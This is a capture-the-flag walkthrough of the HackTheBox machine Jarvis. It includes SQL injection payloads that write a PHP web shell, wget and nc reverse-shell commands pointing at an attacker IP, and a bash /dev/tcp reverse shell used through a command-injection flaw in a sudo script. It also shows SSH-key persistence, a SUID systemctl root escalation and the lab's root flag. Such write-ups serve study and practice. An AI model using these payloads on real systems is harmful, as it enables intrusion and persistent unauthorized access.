## Intro


tags: #OSCPpath #linux #SQL-injection #codereview #known-binary  #medium

total: 2 hours with hints
SQLi injection part was tricky, try again

-----
# Reconnaissance

```shell
source basher target1 10.129.229.137 [IP]
source basher host1 jarvis.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-21 14:33 -0400
Nmap scan report for 10.129.229.137
Host is up (0.16s latency).
Not shown: 58122 closed tcp ports (reset), 7411 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-21 14:33 -0400
Nmap scan report for jarvis.htb (10.129.229.137)
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Stark Hotel
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   89.95 ms 10.10.14.1
2   56.66 ms jarvis.htb (10.129.229.137)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Webapp

![](MediaFiles/Pasted%20image%2020260921213415.png)

### Directories

```shell
gobuster dir -k -u http://jarvis.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

```shell
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jarvis.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 309] [--> http://jarvis.htb/images/]
css                  (Status: 301) [Size: 306] [--> http://jarvis.htb/css/]
js                   (Status: 301) [Size: 305] [--> http://jarvis.htb/js/]
fonts                (Status: 301) [Size: 308] [--> http://jarvis.htb/fonts/]
phpmyadmin           (Status: 301) [Size: 313] [--> http://jarvis.htb/phpmyadmin/]
```

`phpmyadmin`
![](MediaFiles/Pasted%20image%2020260921213825.png)
tried admin:admin
![](MediaFiles/Pasted%20image%2020260921213957.png)
got error, but revealed the existence of mysql server
sqli here did not work
lets try scanning this for files too
```shell
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://jarvis.htb/phpmyadmin/ -x asp,aspx,cgi,htm,html,js,json,jsp,php,pl,py,sh -b 403,404
```

found `README`
![](MediaFiles/Pasted%20image%2020260921221223.png)
this revealed the presense of mysql

lets go back to the home page, on `rooms`
![](MediaFiles/Pasted%20image%2020260921220235.png)
clicking on one of the rooms gives this url
`http://jarvis.htb/room.php?cod=1`
and changing the number changes the page too

tried LFI but no luck

since we know mysql is there, lets try sqli!

------
# Foothold
## SQLi

```shell
' OR '1'='1
' ORDER BY 1--
```
![](MediaFiles/Pasted%20image%2020260921222323.png)
```shell
2 ORDER BY 7
```
but doing this makes the room dissapear like above
```shell
2 ORDER BY 10
```

```shell
10 union select 1,2,3,4,5,6,7
```
![](MediaFiles/Pasted%20image%2020260921222755.png)
this means that the room description is in column number 2 (according to how its displayed normally)

```shell
0 UNION SELECT 1,group_concat(user,0x3a,file_priv),3,4,5,6,7 from mysql.user
```
![](MediaFiles/Pasted%20image%2020260921223258.png)

```shell
33 union select 1,(select '<?php exec(\"wget -O /var/www/html/myshell.php http://10.10.14.247:9001/php-rev.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/ch3ckm8.php'
```
or
```shell
0%20UNION%20SELECT%201,%22%3C?php %20echo%20system($_REQUEST[%27test%27]);%20?%3E%22,3,4,5,6,7%20into %20outfile%20%27/var/www/html/shell.php%27
```
lets confirm
```shell
shell.php?test=whoami
```
![](MediaFiles/Pasted%20image%2020260921223457.png)
lets get rev shell, append this on url
```shell
http://jarvis.htb/shell.php?test=nc%20-e%20/bin/sh%2010.10.14.247%203333
```
## Shell as www-data
```shell
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.229.137] 34528
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@jarvis:/var/www/html$ 
```

### Users enumeration

```shell
www-data@jarvis:/var/www/html$ ls /home
ls /home
pepper
```
tried to cat the user flag but no luck
```shell
www-data@jarvis:/home/pepper$ ls -la
ls -la
total 32
drwxr-xr-x 4 pepper pepper 4096 May  9  2022 .
drwxr-xr-x 3 root   root   4096 May  9  2022 ..
lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout
-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc
drwxr-xr-x 2 pepper pepper 4096 May  9  2022 .nano
-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile
drwxr-xr-x 3 pepper pepper 4096 May  9  2022 Web
-r--r----- 1 root   pepper   33 Sep 21 14:32 user.txt
```

### Filesystem enumeration

```shell
www-data@jarvis:/var/www/html$ cat connection.php
cat connection.php
<?php
$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
?>
```

#### creds obtained
```
DBadmin
imissyou
```

lets try these creds towards `phpmyadmin`, we are in
![](MediaFiles/Pasted%20image%2020260921224318.png)
but nothing further interesting observed here, lets continue with our `www-data` shell
## sudo -l

```shell
www-data@jarvis:/var/www/html/phpmyadmin$ sudo -l
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/var/www/html/phpmyadmin$ 
```

### Custom script
lets run it
```shell
www-data@jarvis:/var/www/html/phpmyadmin$ sudo -u pepper /var/www/Admin-Utilities/simpler.py
< sudo -u pepper /var/www/Admin-Utilities/simpler.py
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************


********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP

```

#### Code review
lets view this python file
```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

#### Vulnerability found
what is interesting is the option to ping attacker ip and only as pepper
```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```
the `exec_ping` function seems to just execute any command we give it
so lets place this in `/tmp/shell`:
```shell
bash -i >& /dev/tcp/10.10.14.247/5555 0>&1
```
then run the script and enter `$(bash /tmp/shell.sh)`
```shell
www-data@jarvis:/var/www/html/phpmyadmin$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
<do -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash /tmp/shell.sh)
$(bash /tmp/shell.sh)
```
got shell as pepper

## Shell as pepper

```shell
└─$ nc -lvnp 5555

listening on [any] 5555 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.229.137] 36846
pepper@jarvis:/usr/share/phpmyadmin$ 
```

### Persistence

we will transfer our public key to the target's pepper user directory
attacker create key pair,
```shell
ssh-keygen
```

```shell
┌──(ch3ckm8㉿kali)-[~/.ssh]
└─$ cat ch3ckm8_rsa.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFLMfFo8voxeHdV8Nd3Km9Up8lTPnhQsNb5u6P0uGDLO ch3ckm8
```
cat pub key and paste it on target: (since the target did not have key setup i setup the folder and permissions)
```shell
mkdir -p /home/pepper/.ssh && rm -rf /home/pepper/.ssh/authorized_keys && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFLMfFo8voxeHdV8Nd3Km9Up8lTPnhQsNb5u6P0uGDLO ch3ckm8" > /home/pepper/.ssh/authorized_keys && chown -R pepper:pepper /home/pepper/.ssh && chmod 700 /home/pepper/.ssh && chmod 600 /home/pepper/.ssh/authorized_keys && cat /home/pepper/.ssh/authorized_keys
```
now ssh as pepper by specifying our private key location
```shell
└─$ ssh -i ~/.ssh/ch3ckm8_rsa pepper@jarvis.htb

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux jarvis 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 10 09:53:15 2023 from 10.10.14.23
pepper@jarvis:~$ 
```

-----
# Privesc

## sudo -l
```shell
sudo -l
```
doesnt work

## SUID

```shell
find / -perm -4000 -ls 2>/dev/null
```

```shell
find / -perm -4000 -ls 2>/dev/null
     3969     32 -rwsr-xr-x   1 root     root        30800 Aug 21  2018 /bin/fusermount
     3827     44 -rwsr-xr-x   1 root     root        44304 Mar  7  2018 /bin/mount
     3924     60 -rwsr-xr-x   1 root     root        61240 Nov 10  2016 /bin/ping
     9420    172 -rwsr-x---   1 root     pepper     174520 Jun 29  2022 /bin/systemctl
     3828     32 -rwsr-xr-x   1 root     root        31720 Mar  7  2018 /bin/umount
     3774     40 -rwsr-xr-x   1 root     root        40536 Mar 17  2021 /bin/su
```

### Known SUID (systemctl)

for `systemctl` found this on gtfobins https://gtfobins.org/gtfobins/systemctl/ option (b)
```shell
echo /bin/sh >/tmp/ch3ckm8
chmod +x /tmp/ch3ckm8
SYSTEMD_EDITOR=/tmp/ch3ckm8 systemctl edit basic.target
```
got root shell!

## Shell as root

```shell
SYSTEMD_EDITOR=/tmp/ch3ckm8 systemctl edit basic.target
# whoami
whoami
root
# id
id
uid=1000(pepper) gid=1000(pepper) euid=0(root) groups=1000(pepper)
# cat /root/root.txt
cat /root/root.txt
ccaef9a4cd6715f11ab722a9af77dc89
# 
```

### Persistence

i will place my public key on the target's root user (since the target did not have key setup i setup the folder and permissions)
```shell
┌──(ch3ckm8㉿kali)-[~/.ssh]
└─$ cat ch3ckm8_rsa.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFLMfFo8voxeHdV8Nd3Km9Up8lTPnhQsNb5u6P0uGDLO ch3ckm8
```
paste it here
```shell
mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFLMfFo8voxeHdV8Nd3Km9Up8lTPnhQsNb5u6P0uGDLO ch3ckm8" > /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && cat /root/.ssh/authorized_keys
```

then on attacker:
```shell
ssh -i ~/.ssh/ch3ckm8_rsa root@jarvis.htb
```

```shell
┌──(ch3ckm8㉿kali)-[~/.ssh]
└─$ ssh -i ~/.ssh/ch3ckm8_rsa root@jarvis.htb   

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux jarvis 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 21 16:31:55 2026 from 10.10.14.247
root@jarvis:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@jarvis:~# 
```

# Extras

interesting finding on root dir  `cat sqli_defender.py`
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
from time import sleep
import os
from datetime import datetime
from datetime import timedelta
import threading
import urllib.request
import netifaces

local_ip = ''
banned = []

class LogClass:
    ip = ''
    date = ''
    code = ''
    longi = ''
    req = ''
    user_agent = ''
    so = ''
    flag = 0
    month = ''

    def __init__(self, ip, date, req, code, length, user_agent):
        self.ip = ip
        regex = '(\d+)/(.*)/(\d+):(.*) ' 
        logEx = re.match(regex, date).groups()
        self.month = str(logEx[1])
        month1 = to_dict(logEx[1])
        date = logEx[2] + '-' + month1 + '-' + logEx[0] + ' ' + logEx[3]
        self.date = date
        self.code = code
        self.length = length
        self.req = self.escape_req(req)
        self.user_agent = user_agent
        self.so = self.get_info_UA()
        self.flag = self.get_flag()
        
    def escape_req(self, req):
        if "'" in req:
            req = req.replace("'","\\'")
        return req

    def get_flag(self):
        r = urllib.parse.unquote(self.req).upper()
        flag = 0
        if self.flag != 0:
            return self.flag
        if "\'" in r or "\"" in r:
            flag = 1
        if 'ORDER' in r:
            flag = 2
        if 'UNION' in r:
            flag = 3
        if '9208%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23' in r:
            flag = 4
        return flag

    def get_info_UA(self):
        if 'Android' in self.user_agent:
            return 'Android'
        if 'Linux' in self.user_agent:
            return 'Linux'
        if 'Windows' in self.user_agent:
            return 'Windows'
        if 'sqlmap' in self.user_agent:
            self.flag = 4
            return 'Sqlmap'
        else:
            return 'Unknown'

def show_banner():
    print('\nSQL Injection Detector - @pepper\n---------------------------------\n\n')
    print(local_ip)
    
def to_dict(name):
        month_dict = {'Jan':'01', 'Feb':'02', 'Mar':'03', 'Apr':'04', 'May':'05', 'Jun':'06', 'Jul':'07', 'Aug':'08', 'Sep':'09', 'Oct':'10', 'Nov':'11', 'Dec':'12'}
        return month_dict[name]
    
def parse_log(line):
    try:
        regex = '(.*?) - - \[(.*?)\] "(.*?)" (\d+) (\d+) "(.*?)" "(.*?)"'
        log_ex = re.match(regex, line).groups()
        register = LogClass(log_ex[0], log_ex[1], log_ex[2], log_ex[3], log_ex[4], log_ex[6])
        return register
    except:
        return False

def follow(thefile):
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            sleep(0.01)
            continue
        yield line
        
def warn_log(attack):
    print('[+] Detected ' + str(attack.ip) + ' ' + str(attack.flag))
    cont = 0
    path = '/home/pepper/Web/Logs/'
    attack_date = attack.date.split('-')[0] + '-' + attack.month + '-' + attack.date.split('-')[2]
    if attack.flag == 4:
        threading.Thread(target=ban, args=(attack,)).start()
    if not os.path.isfile(path + attack.ip + '.txt'):
        f = open(path + attack.ip + '.txt', 'w')
        f.write(attack.ip + '\n' + '-------------' + '\n')
        f.close()
    else:
        f = open(path + attack.ip + '.txt', 'r')
        for i in f.readlines():
            if 'Attack' in i:
                cont = int(i.split(' ')[1])
        f.close()
    f = open(path + attack.ip + '.txt', 'a')
    f.write('Attack %d : Level %d : %s : %s\n\n' %((cont+1), attack.flag, attack_date, attack.req))
    f.close()

def ban(attack):
    num = 0
    print (local_ip)
    if not attack.ip in banned:
        banned.append(attack.ip)
        print(attack.ip)
        print(local_ip)
        os.system('iptables -t nat -I PREROUTING --src %s --dst %s -p tcp --dport 80 -j REDIRECT --to-ports 64999' %(attack.ip, local_ip))
        print('[+] %s banned' % attack.ip)
        banned_list = os.popen('iptables -t nat --line-numbers -L')
        for i in banned_list.read().split('\n'):
            if attack.ip in i:
                num = int(i.split(' ')[0])
        if num != 0:
            sleep(90)
            os.system('iptables -t nat -D PREROUTING %d' % num)
            banned.remove(attack.ip)
            print('[+] %s disbanned' % attack.ip)
    else:
        pass
        
if __name__ == '__main__':
    local_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
    time_counter = datetime.now()
    attackers = {}
    show_banner()
    logfile = open('/var/log/apache2/access.log','r')
    loglines = follow(logfile)
    for line in loglines:
        log = parse_log(line)
        if log:
            if time_counter + timedelta(seconds=8) < datetime.now():
                attackers[log.ip] = 0
                time_counter = datetime.now()
            if log.ip in attackers and 'room.php?cod' in log.req:
                attackers[log.ip] = attackers[log.ip] + 1
            else:
                attackers[log.ip] = 1
            if attackers[log.ip] > 5:
                log.flag = 4
            if log.flag != 0:
                warn_log(log)
# 

```
